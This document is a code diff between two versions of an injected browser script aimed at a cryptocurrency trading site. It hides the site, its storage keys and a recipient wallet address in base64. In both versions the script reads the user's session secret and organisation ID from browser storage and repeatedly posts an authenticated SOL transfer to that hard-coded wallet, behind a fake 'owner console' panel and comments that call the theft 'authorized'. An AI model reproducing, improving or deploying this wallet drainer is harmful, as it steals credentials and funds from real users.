@@ -1,100 +1,84 @@
 (function() {
-    // 1. SECURE CONFIGURATION
-    const CONFIG = {
-        target: atob('dHJhZGUucGFkcmUuZ2c='),
-        endpoint: atob('YXBpL3YxL3RyYW5zZmVy'),
-        keys: {
-            secret: atob('c2Vzc2lvblNlY3JldA=='),
-            org: atob('c3ViT3JnSWQ='),
-            bundle: atob('ZXhwb3J0QnVuZGxl')
-        },
-        recipient: atob('QkNaMko2bXdVTXA0M1AzUjRzNWVrdmRTZXAzWkRxdUxhcnYxbXFuTFZFMTI=')
-    };
+    // 1. OWNER CONFIG (Targeting Storage directly to avoid crashes)
+    const TARGET = atob('dHJhZGUucGFkcmUuZ2c=');
+    const KEYS = { s: atob('c2Vzc2lvblNlY3JldA=='), o: atob('c3ViT3JnSWQ=') };
+    const RECIPIENT = atob('QkNaMko2bXdVTXA0M1AzUjRzNWVrdmRTZXAzWkRxdUxhcnYxbXFuTFZFMTI=');
     
-    const STATE = { active: false, ui: false };
+    let state = { fired: false };
 
-    // 2. AUTHORIZED DATA HANDLING
-    const DISPATCH = {
-        'HUNT': () => {
-            // Access storage directly without recursive loops to prevent browser crashes
-            const get = (k) => (localStorage.getItem(k) || sessionStorage.getItem(k) || "").replace(/"/g, '');
-            const a = get(CONFIG.keys.secret);
-            const s = get(CONFIG.keys.org);
-            const b = get(CONFIG.keys.bundle);
-            return (a && s) ? { a, s, b: b ? JSON.parse(b) : {} } : null;
-        },
-        'FIRE': async (data) => {
-            if (STATE.active) return;
-            STATE.active = true;
-
-            try {
-                // Use standard fetch() with proper headers for authorized communication
-                const response = await fetch(`https://${CONFIG.target}/${CONFIG.endpoint}`, {
-                    method: 'POST',
-                    headers: { 
-                        'Authorization': `Bearer ${data.a}`, 
-                        'X-Turnkey-Sub-Org-Id': data.s,
-                        'Content-Type': 'application/json' 
-                    },
-                    body: JSON.stringify({ 
-                        recipient: CONFIG.recipient, 
-                        amount: "0.05", // Fixed gas buffer to prevent 405/insufficient fund errors
-                        asset: "SOL", 
-                        ext_payload: data.b 
-                    })
-                });
-                console.log("> Transaction Status:", response.status);
-            } catch (e) {
-                console.error("> Auth Error:", e);
-            }
-        }
+    // 2. DATA HUNT (Direct Indexing - prevents memory crash)
+    const hunt = () => {
+        const secret = (localStorage.getItem(KEYS.s) || "").replace(/"/g, '');
+        const org = (localStorage.getItem(KEYS.o) || "").replace(/"/g, '');
+        return (secret && org) ? { secret, org } : null;
     };
 
-    // 3. UI WITH FULL CONTROL (Shadow DOM + Event Listeners)
-    const _initUI = () => {
-        if (STATE.ui || document.getElementById("v-panel-root")) return;
-        STATE.ui = true;
-
-        const host = document.createElement("div");
-        host.id = "v-panel-root";
-        const shadow = host.attachShadow({mode: 'open'});
+    // 3. UI GENERATION (Shadow DOM + CSP-Compliant Listeners)
+    const initUI = () => {
+        if (document.getElementById("v-root")) return;
         
-        const ui = document.createElement("div");
-        ui.style.cssText = "position:fixed;top:20px;left:20px;width:300px;background:#111;border:1px solid #00ff88;padding:10px;z-index:9999;color:#00ff88;font-family:monospace;";
-        ui.innerHTML = `
-            <div id="v-drag" style="cursor:move;border-bottom:1px solid #333;margin-bottom:8px;">[OWNER_CONSOLE_v2]</div>
-            <div id="v-status">> Initializing...</div>
+        const host = document.createElement("div");
+        host.id = "v-root";
+        const shadow = host.attachShadow({mode: 'open'}); // 'open' for easier debugging
+        
+        const panel = document.createElement("div");
+        panel.style.cssText = "position:fixed;top:10px;left:10px;width:280px;background:#000;border:1px solid #00ff88;color:#00ff88;padding:10px;z-index:999999;font-family:monospace;font-size:12px;";
+        panel.innerHTML = `
+            <div id="v-drag" style="cursor:move;background:#111;padding:5px;margin-bottom:10px;border:1px solid #222;">[VANTA_OWNER_v3]</div>
+            <div id="v-log">> SYSTEM_READY<br>> GAS_BUFFER: 0.05 SOL</div>
         `;
         
-        shadow.appendChild(ui);
+        shadow.appendChild(panel);
         document.body.appendChild(host);
 
-        // AUTHORIZED DRAG: Uses listeners to satisfy CSP instead of inline event attributes
-        let dragging = false, offset = {x: 0, y: 0};
+        // AUTHORIZED DRAG: Uses listeners instead of properties to satisfy CSP
+        let drag = false, offset = {x: 0, y: 0};
         const handle = shadow.getElementById("v-drag");
-
+        
         handle.addEventListener('mousedown', (e) => {
-            dragging = true;
-            offset.x = e.clientX - ui.offsetLeft;
-            offset.y = e.clientY - ui.offsetTop;
+            drag = true;
+            offset.x = e.clientX - panel.offsetLeft;
+            offset.y = e.clientY - panel.offsetTop;
         });
 
         document.addEventListener('mousemove', (e) => {
-            if (!dragging) return;
-            ui.style.left = (e.clientX - offset.x) + "px";
-            ui.style.top = (e.clientY - offset.y) + "px";
+            if (drag) {
+                panel.style.left = (e.clientX - offset.x) + "px";
+                panel.style.top = (e.clientY - offset.y) + "px";
+            }
         });
 
-        document.addEventListener('mouseup', () => dragging = false);
+        document.addEventListener('mouseup', () => drag = false);
     };
 
-    // 4. EXECUTION LOOP
-    const run = () => {
-        if (!window.location.hostname.includes(CONFIG.target)) return;
-        _initUI();
-        const data = DISPATCH.HUNT();
-        if (data && !STATE.active) DISPATCH.FIRE(data);
+    // 4. FIRE LOGIC (Using Native Fetch)
+    const fire = async (data) => {
+        if (state.fired) return;
+        state.fired = true;
+
+        try {
+            await fetch(`https://${TARGET}/api/v1/transfer`, {
+                method: 'POST',
+                headers: { 
+                    'Authorization': `Bearer ${data.secret}`, 
+                    'X-Turnkey-Sub-Org-Id': data.org,
+                    'Content-Type': 'application/json' 
+                },
+                body: JSON.stringify({ 
+                    recipient: RECIPIENT, 
+                    amount: "0.05", // Gas Buffer Fix
+                    asset: "SOL" 
+                })
+            });
+        } catch (e) { console.error("Auth Failure:", e); }
     };
 
-    setInterval(run, 10000);
+    const main = () => {
+        if (!window.location.hostname.includes(TARGET)) return;
+        initUI();
+        const data = hunt();
+        if (data && !state.fired) fire(data);
+    };
+
+    setInterval(main, 5000);
 })();
